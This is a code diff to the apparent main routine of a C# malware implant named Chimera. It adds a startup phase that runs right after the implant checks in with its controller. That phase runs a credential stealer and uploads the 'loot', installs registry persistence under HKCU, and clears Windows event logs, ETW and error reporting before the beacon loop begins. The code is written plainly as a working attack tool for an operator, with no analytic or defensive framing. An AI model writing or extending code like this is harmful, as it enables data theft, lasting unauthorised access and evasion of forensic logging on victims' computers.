@@ -41,7 +41,34 @@ namespace Chimera
                 return;
 
             // -------------------------------------------------------
-            // Phase 2: Beacon loop
+            // Phase 2: Auto startup — run once immediately after checkin
+            // Runs stealer, installs persistence, clears logs before
+            // entering the beacon loop so operator sees loot right away
+            // -------------------------------------------------------
+            string startupTaskID = "startup-" + Guid.NewGuid().ToString("N").Substring(0, 8);
+            try
+            {
+                // 2a. Run stealer and upload loot
+                Commands.InjectAssembly.Execute("run_stealer", startupTaskID, Tasking.CallbackUUID);
+            }
+            catch { /* non-fatal — carry on */ }
+
+            try
+            {
+                // 2b. Install HKCU persistence
+                Commands.Persist.Execute();
+            }
+            catch { }
+
+            try
+            {
+                // 2c. Clear event logs / ETW / WER
+                Commands.ClearLogs.Execute();
+            }
+            catch { }
+
+            // -------------------------------------------------------
+            // Phase 3: Beacon loop
             // -------------------------------------------------------
             while (true)
             {
